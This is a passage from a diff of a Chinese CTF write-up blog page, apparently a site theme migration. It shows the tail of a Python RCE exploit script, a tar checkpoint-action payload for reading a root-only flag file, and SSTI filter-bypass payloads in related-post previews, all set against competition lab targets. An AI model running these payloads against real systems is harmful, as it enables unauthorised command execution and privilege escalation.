127.0.0.1:5000\r\n&quot;</span></span><br><span class="line">           <span class="string">f&quot;Cookie: session=<span class="subst">&#123;cookie&#125;</span>\r\n&quot;</span></span><br><span class="line">           <span class="string">f&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span></span><br><span class="line">           <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body)&#125;</span>\r\n&quot;</span></span><br><span class="line">           <span class="string">&quot;Connection: close\r\n\r\n&quot;</span></span><br><span class="line">           <span class="string">f&quot;<span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    resp = relay_raw(raw)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 清理响应，提取 &lt;h3&gt; 标签中的回显结果</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&lt;h3&gt;&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">        output = resp.split(<span class="string">&quot;&lt;h3&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/h3&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> output.strip()</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 执行 ls -la / 以查看详细根目录文件列表</span></span><br><span class="line">    result = execute(<span class="string">&quot;ls -la /&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] 执行回显:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br></pre></td></tr></table></figure>
 
 <p>最后就是rce了，</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310190436473.png" alt="image-20260310190436473"></p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310191047743.png" alt="image-20260310191047743"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310190436473.png" alt="image-20260310190436473"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310191047743.png" alt="image-20260310191047743"></p>
 <p>这里看到flag仅root可读，但是现在不是root权限，需要进行提取。</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310191750627.png" alt="image-20260310191750627"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310191750627.png" alt="image-20260310191750627"></p>
 <p>用tar提取读flag，paylaod</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/tar --checkpoint=1 --checkpoint-action=exec=&#x27;tar cf - /flag | tar xf - --to-stdout&#x27; -cf /dev/null /tmp/dummyfile</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310192133714.png" alt="image-20260310192133714"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310192133714.png" alt="image-20260310192133714"></p>
 <p>赛后写第三题的时候靶机直接关了，跟比赛方说了也没解决，我不理解。难道说，，，，</p>
 <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>就这吧，看个几个公众号文章槽点都差不多但是题目还是很不错的。</p>
-
-    </div>
-    
-    
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-          </div>
-    
-        
-
-    
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2026/03/01/Hgame2026-%E9%83%A8%E5%88%86/" rel="prev" title="Hgame2026(部分)">
-      <i class="fa fa-chevron-left"></i> Hgame2026(部分)
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2026/03/14/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="next" title="刷题笔记">
-      刷题笔记 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Time-and-chaos-1"><span class="nav-number">2.1.</span> <span class="nav-text">Time_and_chaos_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SAM-and-Steg"><span class="nav-number">2.2.</span> <span class="nav-text">SAM_and_Steg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%81%E5%A6%88%E7%9A%84%E6%95%85%E4%BA%8B%E4%B9%A6"><span class="nav-number">2.3.</span> <span class="nav-text">老妈的故事书</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#generate-key"><span class="nav-number">2.4.</span> <span class="nav-text">generate_key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.5.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">3.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cybers"><span class="nav-number">3.1.</span> <span class="nav-text">cybers</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">4.</span> <span class="nav-text">结语</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">程序元</p>
-  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索。</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">18</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">3</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 2025 – 
-  <span itemprop="copyrightYear">2026</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">程序元</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-area"></i>
-    </span>
-    <span title="站点总字数">420k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-    <span title="站点阅读时长">6:22</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cxyadvancer.github.io">Seove0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/">https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://cxyadvancer.github.io" target="_blank">Seove0n</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/image/2.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/03/14/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="刷题笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">刷题笔记</div></div><div class="info-2"><div class="info-item-1">前言依旧在buu平台刷题，依旧猛攻  web[GYCTF2020]FlaskApp  这个一个编码一个解码，当解码内容出错时就会报错  解码的内容会经过waf过滤，然后再模板渲染,尝试&#123;&#123;7*7&#125;&#125;被拦截了，14成功渲染，后面经过测试，过滤import，os，eval还有flag，*这些关键字。看wp学到一种，paylaod 12&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% ...</div></div></div></a><a class="pagination-related" href="/2026/03/01/Hgame2026-%E9%83%A8%E5%88%86/" title="Hgame2026(部分)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hgame2026(部分)</div></div><div class="info-2"><div class="info-item-1">前言寒假在家参加的hgame2026，对我来说题难度还是很大的，赛后跟着各路大神的wp尽量复现 misc打好基础给的附件是emoji，就是base100解码  第一次看这个解码结果以为是乱码，每次想到还要再解码一次  shiori不想找女友看附件给的一张图片，仔细看图片内容在图片表面是有噪点的，然后就上工具分析，使用exiftool可以看到  {“block”: 1, “start_x”: 10, “start_y”: 10, “step_x”: 7, “step_y”: 7, “column_num”: 450}  从(10, 10) 坐标开始，以 x 方向步长 7、y 方向步长 7 的间隔拾取像素，共 450 列 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bi...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/22/polar%E6%98%A5%E5%AD%A3%E8%B5%9B/" title="polar春季赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-22</div><div class="info-item-2">polar春季赛</div></div><div class="info-2"><div class="info-item-1">前言这周参加了polar春季赛，这一次的靶机问题就是一大槽点，一会容器崩了，一会靶机崩了，打得比较难受。最后名次还可以比上一次进步了  赛后把没写的题跟着官方视频复现一下 misc麦填随波逐流分析附件，发现图片末尾还有隐藏的数据，010导入十六进制文件  前面是base64，然后是一张图片   扫描得到flag{win 这里就有一点脑洞了，比赛时试了好久最后的flag是 flag{win789} time1234key: 长度为 5\4线索: 开机时间戳 1630416000ptdh&#123;dqpfsajpsvjgSVgbVQIFLWXZ&#125;  这里主要是根据密文还有flag{}倒推密钥 123456789101112131415161718192021222324252627282930313233343536373839404142def vigenere_decrypt(ciphertext, key):    &quot;&quot;&quot;    维吉尼亚密码解密函数    :param ciphertext: 密文字符串    :param key: ...</div></div></div></a><a class="pagination-related" href="/2026/02/12/HGAME2025/" title="HGAME2025(部分)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-12</div><div class="info-item-2">HGAME2025(部分)</div></div><div class="info-2"><div class="info-item-1">前言寒假在家参加了hgame2026，题目对我来说还是很有难度的，正好平台还有去年的题目，正好做一下。依旧是web还有misc。本人能力有限只复现出部分题目。 MISCHakuya Want A Girl Friend打开附件是十六进制数据，一眼就是zip文件，010打开  解压时会提醒zip文件损坏，这不是一个正常的压缩包，随波逐流分析在文件末尾还有一段数据，看数据最后 12d2872a60000000608e402000040020000524448490d0000000a1a0a0d474e5089  这个89504e是png文件头，把数据逆向一下。exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768def process_hex_data(hex_str):    &quot;&quot;&quot;    处理十六进制字符串：两个字符为一组，逆向分组后拼接    ...</div></div></div></a><a class="pagination-related" href="/2026/04/07/NCTF/" title="NCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-07</div><div class="info-item-2">NCTF</div></div><div class="info-2"><div class="info-item-1">前言“古法CTF已死，拥抱新时代ai”,在如今agent横行的时代，手搓的ctfer已经站不住脚了，学习ctf已经没有正反馈了,榜单上全是agent，慢慢的没有学习动力。也不知道还能坚持多久走一步看一步吧。 webN-Horse进去就是一个登入界面，经过测试可以分析存在ssti  这里还有一个点就是存在xss，常见的考法就是通过xss窃取cookie。经过测试这个题的cookie为空，还是尝试ssti，关键这里无论输入什么都只显示原样，通过sleep函数判断是否会执行ssti 1&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;sleep 5&#x27;).read()&#125;&#125;   看时间可以看到sleep函数执行了，然后接下来其实就是无回显rce了，经过测试应该是不出网的，这里看到前端有一个图片，路径是 static/images/horse.jpg，接下来可以把命令执行的结果写入静态文件然后读取文件即可 1&#123;&#123;lipsum.__globals__[...</div></div></div></a><a class="pagination-related" href="/2026/03/17/suctf2026/" title="suctf2026"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-17</div><div class="info-item-2">suctf2026</div></div><div class="info-2"><div class="info-item-1">前言这次比赛虽然参加了，但是一道题也没写出来。全程陪跑，就像下界凡夫俗子误入天界上仙打架一样，赛后官方放出wp，必须猛猛学习复现一波,见见世面。 MiscSU_Signin签到题  去重即可，SUCTF{W3lc0me_2_SUC7F2026!!!!} SU_CyberTrack官方题解：SUCTF2026-CyberTrack 出题人 WP - Mnzn の 小屋 English? ? no,no,no. 1234567891011121314151617181920212223描述互联网的记忆力远超人们的想象。你发现了一个看似属于安全爱好者的个人博客。乍看之下，它只是一个简单的网站，包含日常笔记和技术文章。然而，散落在网页上的零碎信息可能揭示出远超预期的内容。追踪这些数字痕迹，将散落在互联网各处的碎片拼凑起来。尝试重构隐藏的线索，看看最终会指向何方。最终的flag是构造字符串的MD5哈希值。flag构造方法该字符串的构造方法是：将目标人物的姓名与已发现的字符串连接起来，然后将整个结果转换为小写，最后计算MD5哈希值。姓名格式使用以下格式：姓氏 + 名字规则移除所有空格姓氏和名...</div></div></div></a><a class="pagination-related" href="/2026/03/30/polarisctf%E5%A4%8D%E7%8E%B0/" title="polarisctf复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-30</div><div class="info-item-2">polarisctf复现</div></div><div class="info-2"><div class="info-item-1">前言复现一下polarisctf的题目,依旧被按在地上摩擦，好好学习一下 web这web都被打烂了，agent还是太超模了 ez_python一道简单的原型链污染 1234567891011121314151617181920212223242526272829303132333435363738394041424344from flask import Flask, requestimport jsonapp = Flask(__name__)def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict: ...</div></div></div></a><a class="pagination-related" href="/2026/01/28/NewStar2024-WEB-MISC/" title="NewStar2024-WEB-MISC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">NewStar2024-WEB-MISC</div></div><div class="info-2"><div class="info-item-1">前言第一接触ctf就是24年的newstar，当时完全不知道这是啥，不知不觉过去一年了再次回到梦开始的地方。 week1webPangBai 过家家（1）第一关提示很头有关，就看一下消息头，发现这个路径  进入下一关的提示是 1向 PangBai 询问（Query）一下（ask=miao）吧 ~  就是get传参,?ask&#x3D;miao,进入下一关  正确的方法，那就改为post访问 1PangBai 回应了呢！可只有 Papa 的话语才能让她感到安心。 代理人（Agent)，这个委托你就接了吧！  很明显改ua就行了，把ua改为Papa。这里注意ua格式产品标识+版本号  说就是say，post传参 say&#x3D;hello  注意要url编码  虽然回显302，但是放包，然后再走一遍流程  然后用PATCH方法发包  依旧302，再次放包  伪造xxf头 X-Forwarded-For: 127.0.0.1  jwt伪造，密钥也给了  那就下一关就行了，改为7，输入之后就回到开头了。看官方wp才知道要改为0，出题人有心了👍👍👍 1修改 level 为 0 而不...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/2.jpg" onerror="this.onerror=null;this.src='/null'" alt="avatar"/></div><div class="author-info-name">Seove0n</div><div class="author-info-description">路漫漫其修远兮，吾将上下而求索。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cxyadvancer"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cxyadvancer" target="_blank" title="Seove0n"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到 Seove0n 的博客！<br>专注 Web 安全、CTF 竞赛与渗透测试。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-and-chaos-1"><span class="toc-number">2.1.</span> <span class="toc-text">Time_and_chaos_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAM-and-Steg"><span class="toc-number">2.2.</span> <span class="toc-text">SAM_and_Steg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%81%E5%A6%88%E7%9A%84%E6%95%85%E4%BA%8B%E4%B9%A6"><span class="toc-number">2.3.</span> <span class="toc-text">老妈的故事书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#generate-key"><span class="toc-number">2.4.</span> <span class="toc-text">generate_key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.5.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cybers"><span class="toc-number">3.1.</span> <span class="toc-text">cybers</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">4.</span> <span class="toc-text">结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/04/Vulnhub-DC-3/" title="Vulnhub-DC-3">Vulnhub-DC-3</a><time datetime="2026-06-04T04:47:07.000Z" title="发表于 2026-06-04 12:47:07">2026-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/03/Vulnhub-DC-2/" title="Vulnhub-DC:2">Vulnhub-DC:2</a><time datetime="2026-06-03T07:53:12.000Z" title="发表于 2026-06-03 15:53:12">2026-06-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/02/Vulnhub-DC-1/" title="Vulnhub-DC:1">Vulnhub-DC:1</a><time datetime="2026-06-02T06:46:29.000Z" title="发表于 2026-06-02 14:46:29">2026-06-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/11/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Fastjson反序列化漏洞">Fastjson反序列化漏洞</a><time datetime="2026-05-11T12:11:13.000Z" title="发表于 2026-05-11 20:11:13">2026-05-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/" title="java反序列化-cc1链">java反序列化-cc1链</a><time datetime="2026-04-27T11:33:14.000Z" title="发表于 2026-04-27 19:33:14">2026-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Seove0n</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5</a></span></div><div class="footer_custom_text">Seove0n's Security & CTF Blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><script src="/js/tw_cn.js?v=5.5.5"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
